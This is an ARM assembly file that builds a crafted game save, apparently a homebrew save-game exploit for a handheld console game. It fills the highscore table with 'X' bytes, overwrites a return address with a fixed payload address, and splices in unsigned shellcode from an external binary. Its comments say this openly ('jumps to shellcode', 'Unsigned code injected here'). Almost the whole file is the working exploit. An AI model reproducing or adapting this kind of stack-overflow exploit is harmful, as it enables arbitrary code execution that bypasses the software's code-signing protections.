.arm
.global _start
.section .init

#define PAYLOAD_ADR 0x023c2fb0

.macro fill_repeat count, size, value, text
    .rept \count
        .fill \size, 1, 0
        .ascii "\text"
    .endr
.endm

_start:
	.word 0		@ CRC32
	.byte 0x03
	
	.org 0x0C
	.byte 0xBF, 0x0A
	
	.fill 7, 4, 0x05DC0000
	.fill 8, 4, 0x07D00000
	.fill 16, 4, 0x09C40000
	.fill 16, 4, 0x0BB80000
	.fill 13, 4, 0x0DAC0000
	.fill 8, 4, 0x05DC0000
	.fill 8, 4, 0x07D00000
	.fill 8, 4, 0x09C40000
	.fill 8, 4, 0x0BB80000
	.fill 3, 4, 0x0DAC0000
	.fill 8, 4, 0x0BB80000
	.fill 8, 4, 0x0DAC0000
	.fill 8, 4, 0x0FA00000
	.fill 7, 4, 0x11940000
	
	.org 0x208
	.fill 0x1D6, 1, 0x58		@ fills the highscore stack with with a bunch of 'X'(s)
	.word PAYLOAD_ADR			@ jumps to shellcode; offset 0xAB4

	.fill 6, 1, 0
	.ascii "Gavin"

	fill_repeat 20, 7, 0, "Gavin"
	fill_repeat 1, 7, 0, "Marc"
	fill_repeat 34, 8, 0, "Marc"
	fill_repeat 1, 8, 0, "Sebastian"
	fill_repeat 15, 3, 0, "Sebastian"
	fill_repeat 1, 3, 0, "Magellan"
	fill_repeat 14, 4, 0, "Magellan"
	
	.org 0x7FC
	.ascii "HAXXXXXXXX"		@ Profile-Slot 1; can be exploited as well, not fun dealing with stack corruption though :/

	.byte 0, 0, 0, 0x08, 0, 0, 0, 0x10
	
	.org 0x818
	.byte 0x5C, 0x17
	
	.org 0x824
	.byte 0x05
	
	.org 0x82C
	.byte 0x06
	
	.org 0x834
	.byte 0x02
	
	.org 0x840
	.byte 0x01
	
	.org 0x848
	.byte 0x01
	
	.org 0x884
	.byte 0x01
	
	.org 0x890
	.word 0x00000001, 0x00000001
	
	.org 0x898
	.byte 0x63, 0x52, 0x03
	
	.org 0x8A0
	.word 0x00000001
	.byte 0xBF, 0x0A
	
	.org 0x8A9
	.rept 7
		.ascii "cene_desk1_objects.mxa"		@ 3D objecs(?)
		.fill 0x2F, 1, 0
	.endr
	.ascii "cene_desk1_objects.mxa"
	
payload:
	.org 0xAB4
	.incbin "./payload/payload.bin"		@ Unsigned code injected here :)	
	
misc_data:
	.org 0x12A0
	.fill 0x1E0, 1, 0xFF
	
	.org 0x1680
	.fill 6, 4, 0x0000000A
	
	.org 0x16CE
	.word 0x08000000, 0x10000000
	
	.org 0x16E8
	.word 0xFFFFFFFF, 0, 0xFFFFFFFF
	
	.org 0x1A04
	.fill 0x1E0, 1, 0xFF
	
	.org 0x1DE1
	.fill 6, 4, 0x0A000000
	
	.org 0x1E28
	.byte 0x24, 0x1E
	.fill 0x1D6, 1, 0